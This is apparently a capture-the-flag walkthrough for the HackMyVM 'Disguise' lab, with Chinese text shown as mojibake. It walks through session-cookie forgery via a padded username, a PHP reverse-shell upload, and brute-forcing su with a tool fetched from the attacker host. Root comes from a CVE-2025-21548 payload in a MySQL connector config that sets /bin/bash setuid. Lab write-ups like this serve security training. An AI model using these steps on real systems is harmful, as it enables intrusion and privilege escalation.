> å¯¼å…¥å®Œé¶æœºï¼ŒIPå˜äº†ï¼ŒYakitä¹Ÿè¦é‡å¯ï¼Œå¦åˆ™å¥½åƒä¸æ›´æ–° hosts

```bash
POST /register.php HTTP/1.1
Host: dark.disguise.hmv
Referer: http://dark.disguise.hmv/register.php
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=o6qrldi4ugpjot3gcibnhi6ndl
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://dark.disguise.hmv
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Length: 43

username=simpleAdmin%01&password=aaaa&captcha=564B93
```

çœ‹ä¸€ä¸‹å“åº”ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258215.png" alt="image-20250621005903883" style="zoom:50%;" />

å•¥æƒ…å†µå•Šè¿™ã€‚ã€‚ã€‚ã€‚ã€‚æˆ‘ä¹‹å‰è¿˜ä»¥ä¸ºæˆ‘æé”™äº†å‘¢ã€‚ã€‚ã€‚ã€‚ä¸ç®¡ä»–åŠ«æŒï¼Œç„¶åç›´æ¥ä¿®æ”¹å®Œç›´æ¥æ”¾è¡Œå³å¯ï¼š

```bash
POST /register.php HTTP/1.1
Host: dark.disguise.hmv
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Cookie: PHPSESSID=o6qrldi4ugpjot3gcibnhi6ndl
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Origin: http://dark.disguise.hmv
Upgrade-Insecure-Requests: 1
Referer: http://dark.disguise.hmv/register.php
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 43

username=simpleAdmin%01&password=pass&captcha=EGW42R
```

è®°å¾—å¤šæ”¾è¡Œå‡ æ¬¡ï¼Œå®Œæˆè·³è½¬æ‰ç®—æ³¨å†ŒæˆåŠŸï¼ï¼ï¼ï¼

ç„¶åå†åŠ«æŒç™»å½•ç•Œé¢ï¼Œä¿®æ”¹ç”¨æˆ·åç™»å½•å³å¯è·å–`dark_session`ï¼š

```bash
POST /login.php HTTP/1.1
Host: dark.disguise.hmv
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=cfbf7fm4s3lo22ggj87mpshcnk
Accept-Language: zh-CN,zh;q=0.9
Origin: http://dark.disguise.hmv
Content-Type: application/x-www-form-urlencoded
Referer: http://dark.disguise.hmv/login.php
Content-Length: 28

username=simpleAdmin%01&password=pass
```

è·å¾—ç›¸å…³å†…å®¹ï¼š

```bash
GET /profile.php HTTP/1.1
Host: dark.disguise.hmv
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Referer: http://dark.disguise.hmv/login.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=cfbf7fm4s3lo22ggj87mpshcnk; dark_session=%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```

å°è¯•è¿›è¡Œè§£å¯†ï¼Œä¼ªé€ ç›¸å…³å†…å®¹ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258216.png" alt="image-20250621012624453" style="zoom:50%;" />

```bash
fb5fb7fcdc422dc211d09abda83b9d17c27091faec39d4b15b5ea96eccc624b6
fb5fb7fcdc422dc211d09abda83b9d17
c27091faec39d4b15b5ea96eccc624b6
```

å’±ä»¬åªè¦ä¸Šé¢çš„å°±è¡Œäº†ï¼ï¼ï¼ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258217.png" alt="image-20250621012820094" style="zoom:50%;" />

```bash
%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D
```

ä½¿ç”¨è¿™ä¸ª`dark_session`å³å¯è¿›è¡Œä¼ªé€ ç™»å½•ï¼ï¼ˆç›´æ¥æ›¿æ¢åŸæœ‰çš„å†åˆ·æ–°å³å¯ï¼ï¼‰

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258218.png" alt="image-20250621013037003" style="zoom:50%;" />

### ä¸Šä¼ æ–‡ä»¶åå¼¹shell

çœ‹çœ‹æœ‰å•¥æƒé™å¯ä»¥è¿›è¡Œè·å–shellï¼ï¼ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258219.png" alt="image-20250621013109532" style="zoom:50%;" />

å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼ï¼ï¼ï¼ï¼å°è¯•ä¸Šä¼ ä¸€ä¸ªåå¼¹shellï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¿›è¡Œæ¿€æ´»ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258220.png" alt="image-20250621013454701" style="zoom:33%;" />

å¯ä»¥æ­£å¸¸ä¸Šä¼  php æ–‡ä»¶ï¼Œå°è¯•æ‰¾ä¸€ä¸‹åœ°å€ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258222.png" alt="image-20250621013551642" style="zoom:50%;" />

å‘ç°äº†ä¸€å¤„å‚æ•°ä¼ é€’ï¼Œçœ‹ä¸Šå»å°±æ˜¯å’±ä»¬çš„åå¼¹shellï¼Œè®¿é—®çœ‹çœ‹æ˜¯å¦å¯ä»¥å¼¹å›shellï¼Œä½†æ˜¯å¤±è´¥äº†ã€‚ã€‚ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258223.png" alt="image-20250621013712561" style="zoom:33%;" />

åªèƒ½è¯»å–ï¼Œä¸èƒ½æ‰§è¡Œï¼Œä¹‹å‰ä¿¡æ¯æœé›†çš„æ—¶å€™é‡åˆ°äº†ï¼š

```bash
/images               (Status: 301) [Size: 323] [--> http://dark.disguise.hmv/images/]
```

çŒœæµ‹æ–‡ä»¶å¯èƒ½é‡å‘½åäº†ï¼Œè¢«æ”¾å…¥äº†`/image`æ–‡ä»¶å¤¹ä¸‹ï¼Œå°è¯•æ„é€ æŠ¥é”™è§‚å¯Ÿå›æ˜¾ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258224.png" alt="image-20250621014522853" style="zoom:50%;" />

å°è¯•ä¿®æ”¹æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚ä»·æ ¼ï¼Œæ”¹æˆç¬¦åˆsqlå­—ç¬¦çš„æ··ä¹±ï¼Œæ¯”å¦‚åŠ ä¸ªå•å¼•å·ä¹‹ç±»çš„ï¼Œæ£ä¹±ä½ æ‡‚å§ï¼š

 <img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258225.png" alt="image-20250621014740654" style="zoom:50%;" />

å¾—åˆ°æ–‡ä»¶åœ°å€ï¼Œå°è¯•è®¿é—®ï¼Œæ‹¿åˆ°shellï¼ï¼ï¼ï¼

```bash
http://dark.disguise.hmv/images/99e767ec86972d42e5eff8c47f616470.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258226.png" alt="image-20250621014849260" style="zoom:50%;" />

## ææƒ

### suçˆ†ç ´ç”¨æˆ·å¼±å¯†ç 

```bash
(remote) www-data@disguise:/$ cat /etc/passwd | grep sh | cut -d: -f1
root
sshd
darksoul
(remote) www-data@disguise:/$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Mar 31 11:19 .
drwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..
drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
(remote) www-data@disguise:/$ cd ~
(remote) www-data@disguise:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Mar 31 21:07 .
drwxr-xr-x 12 root     root     4096 Mar 31 11:33 ..
drwxr-xr-x  4 www-data www-data 4096 Apr  2 04:39 dark
drwxr-x---  5 www-data www-data 4096 Apr  2 05:33 html
(remote) www-data@disguise:/var/www$ cd dark
(remote) www-data@disguise:/var/www/dark$ ls -la
total 76
drwxr-xr-x 4 www-data www-data 4096 Apr  2 04:39 .
drwxr-xr-x 4 root     root     4096 Mar 31 21:07 ..
-rw-r--r-- 1 root     root      905 Mar 31 23:01 captcha.php
-rw-r--r-- 1 root     root       95 Apr  1 03:58 config.php
-rw-r--r-- 1 root     root     1736 Apr  1 21:24 functions.php
-rw-r--r-- 1 root     root      660 Apr  1 05:13 image_handler.php
drwxr-xr-x 2 www-data www-data 4096 Jun 20 13:47 images
-rw-r--r-- 1 root     root     1225 Apr  1 05:16 index.php
-rw-r--r-- 1 root     root     2088 Apr  1 04:14 login.php
-rw-r--r-- 1 root     root      237 Mar 31 22:00 logout.php
drwxr-xr-x 2 root     root     4096 Apr  1 22:59 manager
-rw-r--r-- 1 root     root     1142 Apr  1 21:29 profile.php
-rw-r--r-- 1 root     root     4080 Apr  1 04:28 register.php
-rw-r--r-- 1 root     root     4350 Mar 31 22:49 style1.css
-rw-r--r-- 1 root     root     4474 Apr  1 03:40 style2.css
-rw-r--r-- 1 root     root     2342 Apr  1 03:41 style3.css
-rw-r--r-- 1 root     root     2801 Apr  1 04:43 style4.css
(remote) www-data@disguise:/var/www/dark$ cat config.php 
<?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?>
```

æ•°æ®åº“å¯†ç é®ä½äº†ä¸‰ä½`Str0ngPassw0d1***`ï¼Œå°è¯•è¿›è¡Œæ£€ç´¢ã€‚ã€‚ã€‚ã€‚

```bash
(remote) www-data@disguise:/var/www/dark$ grep -Pnir "Str0ngPassw0d1" /var/ 2>/dev/null
/var/www/dark/config.php:4:$DB_PASS = 'Str0ngPassw0d1***';
/var/www/html/wp-config.php:29:define( 'DB_PASSWORD', 'Str0ngPassw0d1!!!' );
(remote) www-data@disguise:/var/www/dark$ grep -Pnir "Str0ngPassw0d1" /home/ 2>/dev/null
/home/darksoul/config.ini:3:password = Str0ngPassw0d1***
```

å°è¯•å¯†ç è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œå°è¯•ä½¿ç”¨è„šæœ¬åˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œç„¶åä½¿ç”¨ç›¸å…³è„šæœ¬è¿›è¡Œçˆ†ç ´ï¼Œè¿™é‡Œå› ä¸ºæˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„éƒ¨åˆ†wpï¼ŒçŸ¥é“äº†å¯†ç ï¼Œæ•…ä½¿ç”¨ç®€æ´è„šæœ¬èŠ‚çœæ—¶é—´ï¼Œå¦åˆ™ä½¿ç”¨`suForce`éœ€è¦ç­‰å¾…è¾ƒé•¿æ—¶é—´ã€‚ã€‚ã€‚è¿™é‡Œå‚è€ƒç¾¤ä¸»çš„è§£å†³æ–¹æ¡ˆï¼Œè¶³å¤Ÿä¼˜é›…å’Œç®€æ´ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/Disguise]
â””â”€$ python                        
Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import string
>>> for i in string.printable:
...     print(i)
...     
0
1
2
3
4
5
6
7
8
9
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
```

å°†å…¶å¤åˆ¶åˆ°é¶æœºï¼Œç„¶åï¼š

```bash
(remote) www-data@disguise:/tmp$ awk '{print "Str0ngPassw0d1"$0$0$0}' dic > aaa
```

å†ä¸‹è½½`suForce`å°è¯•è¿›è¡Œçˆ†ç ´ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258227.png" alt="image-20250621022501870" style="zoom: 33%;" />

```bash
(remote) www-data@disguise:/tmp$ wget http://192.168.10.107:8888/suForce
--2025-06-20 14:21:57--  http://192.168.10.107:8888/suForce
Connecting to 192.168.10.107:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2430 (2.4K) [text/plain]
Saving to: 'suForce'

suForce                                         100%[====================================================================================================>]   2.37K  --.-KB/s    in 0s      

2025-06-20 14:21:57 (575 MB/s) - 'suForce' saved [2430/2430]

(remote) www-data@disguise:/tmp$ chmod +x suForce
(remote) www-data@disguise:/tmp$ ./suForce -u darksoul -w aaa
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 code: d4t4s3c     version: v1.0.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ¯ Username | darksoul
ğŸ“– Wordlist | aaa
ğŸ” Status   | 94/94/100%/Str0ngPassw0d1~~~
â— Fuck!    | Password not found
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€


(remote) www-data@disguise:/tmp$ ./suForce -u darksoul -w aaa
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 code: d4t4s3c     version: v1.0.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ¯ Username | darksoul
ğŸ“– Wordlist | aaa
ğŸ” Status   | 83/94/88%/Str0ngPassw0d1???
ğŸ’¥ Password | Str0ngPassw0d1???
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

ä¸è¡Œå°±å¤šè·‘å‡ éï¼š`Str0ngPassw0d1???`

å°è¯•åˆ‡æ¢ç”¨æˆ·ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258228.png" alt="image-20250621022559001" style="zoom: 50%;" />

### å®šæ—¶ä»»åŠ¡

```bash
darksoul@disguise:/tmp$ cd ~
darksoul@disguise:~$ ls -la
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -> /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       31 Jun 20 14:26 darkshopcount
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cat user.txt 
Good good study & Day day up,but where is the flag?
darksoul@disguise:~$ cat -A user.txt 
Good good study & Day day up,but where is the flag?$
hmv{hiddenflag}^Mdarksoul@disguise:~$ xxd user.txt 
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study 
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  & Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
```

å®é™…ä¸Šæ˜¯è¾“å‡ºäº†ï¼Œä½†æ˜¯åˆè¢«è¦†ç›–äº†ï¼Œæ‰€ä»¥æ²¡çœ‹åˆ°ã€‚`0d`ä»£è¡¨å›è½¦ç¬¦ï¼Œå…‰æ ‡å›åˆ°è¡Œé¦–ï¼Œç»§ç»­è¾“å‡ºã€‚

```bash
darksoul@disguise:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Is a directory
darksoul@disguise:~$ crontab -l
no crontab for darksoul
```

ä¸Šä¼ `pspy64`è¿›è¡ŒæŸ¥çœ‹ï¼š

![image-20250621023511323](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258229.png)

å‘ç°rootå®šæ—¶æ‰§è¡Œä»»åŠ¡ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼š

```bash
darksoul@disguise:/tmp$ ls -la /opt/query.py
-rw-r--r-- 1 root root 870 Apr  1 09:56 /opt/query.py
darksoul@disguise:/tmp$ cat /opt/query.py
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py <configfile>")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf)
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
darksoul@disguise:/tmp$ cat /home/darksoul/config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

é…ç½®æ–‡ä»¶åœ¨å®¶ç›®å½•ä¸‹ï¼Œæ¯«æ— ç–‘é—®å¯ä»¥è¿›è¡Œè¯»å†™ï¼Œä¸è¡Œçš„è¯å°±æŠŠå®ƒåˆ æ‰é‡å»ºï¼Œå°è¯•åˆ©ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œææƒã€‚ã€‚ã€‚

å‘ç°å¼•ç”¨äº†ä¸€ä¸ªpythonçš„åº“ï¼Œçœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œæ˜¯å¦å­˜åœ¨ç›¸å…³çš„æ¼æ´ï¼š

```bash
darksoul@disguise:/tmp$ pip list
Package                Version
---------------------- -------------
certifi                2018.8.24
chardet                3.0.4
httplib2               0.11.3
idna                   2.6
mysql-connector-python 8.0.33
pip                    24.0
protobuf               3.20.3
pycurl                 7.43.0.2
PySimpleSOAP           1.16.2
python-apt             1.8.4.3
python-debian          0.1.35
python-debianbts       2.8.2
reportbug              7.5.3+deb10u2
requests               2.21.0
setuptools             68.0.0
six                    1.12.0
urllib3                1.24.1
wheel                  0.42.0
```

### CVE-2025-21548

è¿™åˆ©ç”¨åˆ°äº†ä¸€ä¸ªcveæ¼æ´ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒï¼š

- https://dev.mysql.com/doc/connector-python/en/connector-python-connectargs.html
- https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487315&idx=1&sn=4a145deeb3c9c632593bb92f6a88d217&poc_token=HMWrVWij15l_XHSHpC-0tgfekMW92f-IIleMzzxH

```bash

[incorrect_config]

user=root
password=mypass
database=cpydata
port=int(3306)
allow_local_infile=__import__('os').system('calc')
```

å°è¯•åˆ©ç”¨è¿›è¡Œææƒï¼š

```bash
darksoul@disguise:~$ cat config.ini 
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
darksoul@disguise:~$ mv config.ini config.ini.bak
darksoul@disguise:~$ vi config.ini
darksoul@disguise:~$ nano config.ini
darksoul@disguise:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
darksoul@disguise:~$ cat config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__('os').system('chmod +s /bin/bash')
```

è¿‡ä¸€ä¼šç­‰å®šæ—¶ä»»åŠ¡æ‰§è¡Œå³å¯ï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506210258230.png" alt="image-20250621025335514" style="zoom:33%;" />

## ä¸€äº›æœ‰æ„æ€çš„æºä»£ç ï¼ï¼ï¼

æ„Ÿè°¢å¤§ä½¬çš„é¶åœºï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œæ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„é¶åœºï¼ï¼ï¼ï¼

```html
darksoul@disguise:/var/www/dark# ls -la
total 76
drwxr-xr-x 4 www-data www-data 4096 Apr  2 04:39 .
drwxr-xr-x 4 root     root     4096 Mar 31 21:07 ..
-rw-r--r-- 1 root     root      905 Mar 31 23:01 captcha.php
-rw-r--r-- 1 root     root       95 Apr  1 03:58 config.php
-rw-r--r-- 1 root     root     1736 Apr  1 21:24 functions.php
-rw-r--r-- 1 root     root      660 Apr  1 05:13 image_handler.php
drwxr-xr-x 2 www-data www-data 4096 Jun 20 13:47 images
-rw-r--r-- 1 root     root     1225 Apr  1 05:16 index.php
-rw-r--r-- 1 root     root     2088 Apr  1 04:14 login.php
-rw-r--r-- 1 root     root      237 Mar 31 22:00 logout.php
drwxr-xr-x 2 root     root     4096 Apr  1 22:59 manager
-rw-r--r-- 1 root     root     1142 Apr  1 21:29 profile.php
-rw-r--r-- 1 root     root     4080 Apr  1 04:28 register.php
-rw-r--r-- 1 root     root     4350 Mar 31 22:49 style1.css
-rw-r--r-- 1 root     root     4474 Apr  1 03:40 style2.css
-rw-r--r-- 1 root     root     2342 Apr  1 03:41 style3.css
-rw-r--r-- 1 root     root     2801 Apr  1 04:43 style4.css
darksoul@disguise:/var/www/dark# cat register.php
<?php 
include 'functions.php';

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = base64_encode($_POST['password']);
    $captcha = $_POST['captcha'];
    
    if(!verify_captcha($captcha)) {
        $error = "éªŒè¯ç ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°è¾“å…¥";
        generate_captcha();
    } else {
        $conn = db_connect();
        
        // æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å·²å­˜åœ¨
        $check_stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
        $check_stmt->bind_param("s", $username);
        $check_stmt->execute();
        $check_stmt->store_result();
        
        if($check_stmt->num_rows > 0) {
            $error = "ç”¨æˆ·åå·²å­˜åœ¨ï¼Œè¯·é€‰æ‹©å…¶ä»–ç”¨æˆ·å";
            generate_captcha();
        } else {
            $stmt = $conn->prepare("INSERT INTO users (username, password, isAdmin) VALUES (?, ?, FALSE)");
            $stmt->bind_param("ss", $username, $password);
            
            if($stmt->execute()) {
                $_SESSION['register_success'] = true;
                header("Location: register.php");
                generate_captcha();
                exit();
            } else {
                $error = "æ³¨å†Œå¤±è´¥: ".$conn->error;
                generate_captcha();
            }
            $stmt->close();
        }
        $check_stmt->close();
        $conn->close();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>æ³¨å†Œ - æš—é»‘å•†åº—</title>
    <link rel="stylesheet" href="style2.css">
    <?php if(isset($_SESSION['register_success'])): ?>
    <meta http-equiv="refresh" content="3;url=login.php">
    <?php endif; ?>
    <script>
        function validateForm() {
            var username = document.forms["register"]["username"].value;
            if(username.length > 8) {
                alert("ç”¨æˆ·åä¸èƒ½è¶…è¿‡8ä¸ªå­—ç¬¦");
                return false;
            }
            return true;
        }
    </script>
</head>
<body>
    <div class="auth-container">
        <div class="auth-card">
            <?php if(isset($_SESSION['register_success'])): ?>
                <?php unset($_SESSION['register_success']); ?>
                <div class="auth-success">
                    <h2 class="auth-title">æ³¨å†ŒæˆåŠŸ!</h2>
                    <p>3ç§’åå°†è·³è½¬åˆ°ç™»å½•é¡µé¢...</p>
                </div>
            <?php else: ?>
                <h2 class="auth-title">åˆ›å»ºè´¦å·</h2>
                
                <?php if(isset($error)): ?>
                    <div class="auth-error"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>
                
                <form name="register" method="post" onsubmit="return validateForm()">
                    <div class="auth-input-group">
                        <input type="text" class="auth-input" name="username" placeholder=" " required>
                        <label class="auth-input-label">ç”¨æˆ·å</label>
                    </div>
                    
                    <div class="auth-input-group">
                        <input type="password" class="auth-input" name="password" placeholder=" " required>
                        <label class="auth-input-label">å¯†ç </label>
                    </div>
                    
                    <div class="captcha-container">
                        <div class="auth-input-group" style="flex: 1">
                            <input type="text" class="auth-input" name="captcha" placeholder=" " required>
                            <label class="auth-input-label">éªŒè¯ç </label>
                        </div>
                        <img src="captcha.php" class="captcha-image" onclick="this.src='captcha.php?'+Math.random()">
                    </div>
                    
                    <button type="submit" class="auth-button">æ³¨ å†Œ</button>
                </form>
                
                <div class="auth-footer">
                    å·²æœ‰è´¦å·? <a href="login.php" class="auth-link">ç«‹å³ç™»å½•</a>
                </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
darksoul@disguise:/var/www/dark# cat profile.php
<?php
include 'functions.php';

if(!isset($_COOKIE['dark_session'])) {
    header("Location: login.php");
    exit();
}

$username = get_dark_session($_COOKIE['dark_session']);
$isAdmin = is_admin($username);
?>
<!DOCTYPE html>
<html>
<head>
    <title>ä¸ªäººä¸­å¿ƒ - æš—é»‘å•†åº—</title>
    <link rel="stylesheet" href="style3.css">
</head>
<body>
    <header>
        <h1>æš—é»‘å•†åº—</h1>
        <nav>
            <span>æ¬¢è¿, <?php echo htmlspecialchars($username); ?> 
            <?php if($isAdmin): ?>(ç®¡ç†å‘˜)<?php endif; ?></span> | 
            <a href="index.php">é¦–é¡µ</a> | 
            <?php if($isAdmin): ?>
                <a href="manager/">ç®¡ç†åå°</a> | 
            <?php endif; ?>
            <a href="logout.php">é€€å‡º</a>
        </nav>
    </header>
    
    <div class="profile">
        <h2>ä¸ªäººä¸­å¿ƒ</h2>
        <p>æ¬¢è¿è®¿é—®æ‚¨çš„ä¸ªäººä¸»é¡µï¼Œè¿™é‡Œå¯ä»¥æŸ¥çœ‹å’Œç®¡ç†æ‚¨çš„è´¦æˆ·ä¿¡æ¯</p>
        
        <?php if($isAdmin): ?>
            <div class="admin-badge">
                <p>æ‚¨æ‹¥æœ‰ç³»ç»Ÿç®¡ç†å‘˜æƒé™</p>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
darksoul@disguise:/var/www/dark# cat captcha.php
<?php
session_start();

// Error reporting
